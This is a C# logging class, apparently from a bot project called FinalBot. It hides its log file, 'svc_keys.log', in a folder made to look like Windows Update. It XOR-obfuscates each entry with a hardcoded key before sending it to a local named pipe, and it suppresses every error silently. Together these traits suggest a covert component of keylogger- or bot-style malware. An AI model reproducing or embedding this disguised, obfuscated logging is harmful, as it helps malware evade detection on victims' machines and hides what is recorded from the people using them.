using System;
using System.IO;
using System.Text;
using System.IO.Pipes;

namespace FinalBot
{
    public static class Logger
    {
        private static readonly string LogFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_keys.log");
        private static readonly object _lock = new object();
        private static readonly string Salt = "n2xkNQYbZwj8r9fz";

        public static void Log(string message, string level = "INFO")
        {
            try
            {
                lock (_lock)
                {
                    string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                    string logEntry = $"[{timestamp}] [{level}] {message}";
                    
                    ConfigureConsoleColor(level);
                    Console.WriteLine(logEntry);
                    Console.ResetColor();

                    try { File.AppendAllText(LogFile, logEntry + Environment.NewLine); } catch { }

                    SendToPipe(logEntry);
                }
            }
            catch { }
        }

        private static void SendToPipe(string message)
        {
            try
            {
                byte[] data = Encoding.UTF8.GetBytes(message);
                byte[] saltBytes = Encoding.UTF8.GetBytes(Salt);
                byte[] encrypted = new byte[data.Length];

                for (int i = 0; i < data.Length; i++)
                {
                    encrypted[i] = (byte)(data[i] ^ saltBytes[i % saltBytes.Length]);
                }

                string base64 = Convert.ToBase64String(encrypted);

                using (var pipeClient = new NamedPipeClientStream(".", "vanguard_status_pipe", PipeDirection.Out))
                {
                    pipeClient.Connect(200);
                    using (var writer = new StreamWriter(pipeClient))
                    {
                        writer.Write(base64);
                        writer.Flush();
                    }
                }
            }
            catch { }
        }

        public static void Error(string message, Exception ex = null)
        {
            string fullMessage = ex == null ? message : $"{message} | Exception: {ex.Message}\n{ex.StackTrace}";
            Log(fullMessage, "ERROR");
        }

        public static void Warn(string message)
        {
            Log(message, "WARN");
        }

        public static void Info(string message)
        {
            Log(message, "INFO");
        }

        private static void ConfigureConsoleColor(string level)
        {
            switch (level)
            {
                case "ERROR": Console.ForegroundColor = ConsoleColor.Red; break;
                case "WARN": Console.ForegroundColor = ConsoleColor.Yellow; break;
                case "INFO": Console.ForegroundColor = ConsoleColor.Cyan; break;
            }
        }
    }
}
